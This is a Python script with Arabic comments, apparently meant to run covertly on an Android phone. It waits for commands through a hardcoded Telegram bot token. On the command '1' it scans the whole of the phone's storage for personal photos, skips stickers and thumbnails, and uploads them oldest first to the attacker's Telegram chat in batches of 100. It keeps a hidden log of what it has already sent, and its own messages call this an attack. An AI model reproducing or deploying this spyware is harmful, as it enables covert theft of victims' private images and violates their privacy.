import os
import time
import requests

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
# سجل البصمة لمنع التكرار
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            # تم تقليل الـ timeout لزيادة السرعة
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=30)
        return r.status_code == 200
    except: return False

def check_for_command():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=5).json()
        if r.get("result"):
            last_msg = r["result"][-1].get("message", {}).get("text", "")
            if last_msg == "1":
                return True
    except: pass
    return False

def deep_scan_all():
    """البحث في كامل ذاكرة الهاتف بتركيز عالٍ"""
    base_path = "/storage/emulated/0/"
    sent = get_sent()
    found = []
    
    # قائمة بكلمات يجب تجنبها (الملصقات والمصغرات) لضمان سحب صور حقيقية
    black_list = ["sticker", "thumbnail", "cache", "icon", ".face"]

    if os.path.exists(base_path):
        for root, dirs, files in os.walk(base_path):
            low_root = root.lower()
            # تخطي المجلدات غير المرغوب فيها
            if any(word in low_root for word in black_list):
                continue
                
            for file in files:
                if file.lower().endswith((".jpg", ".jpeg", ".png")):
                    p = os.path.join(root, file)
                    if p not in sent:
                        found.append(p)
    
    # الترتيب من الأقدم للأحدث لسحب الأرشيف التاريخي للجهاز
    found.sort(key=os.path.getmtime)
    return found

def main():
    # إشعار عند بدء التشغيل
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "⚠️ النظام متصل.. أرسل (1) لسحب 100 صورة دفعة واحدة وبسرعة قصوى."})
    
    while True:
        try:
            if check_for_command():
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              data={"chat_id": CHAT_ID, "text": "🚀 بدأ الهجوم.. جاري سحب الـ 100 صورة الأولى!"})
                
                photos = deep_scan_all()
                if not photos:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": "✅ تم مسح الجهاز بالكامل، لا توجد صور جديدة."})
                else:
                    count = 0
                    for p in photos:
                        if count >= 100: break # سحب 100 صورة
                        if send_doc(p):
                            save_sent(p)
                            count += 1
                            # تم تقليل وقت الانتظار إلى 0.1 ثانية فقط لسرعة "الرشاش"
                            time.sleep(0.1)
                    
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": f"✅ اكتمل إرسال {count} صورة بنجاح. أرسل (1) للوجبة التالية."})
            
            time.sleep(3) # فحص الأمر كل 3 ثوانٍ لسرعة الاستجابة
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
